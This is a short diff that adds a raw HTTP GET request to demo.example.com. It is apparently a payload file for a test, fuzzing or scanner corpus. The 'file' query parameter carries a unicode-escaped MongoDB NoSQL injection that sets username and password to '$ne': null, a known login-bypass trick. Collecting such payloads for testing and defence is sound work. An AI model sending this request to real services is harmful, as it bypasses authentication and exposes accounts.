@@ -1,0 +1,4 @@
+GET /a?file={\u0022username\u0022:{\u0022$ne\u0022:null},\u0022password\u0022:{\u0022$ne\u0022:null}} HTTP/1.1
+Host: demo.example.com
+Connection: close
+
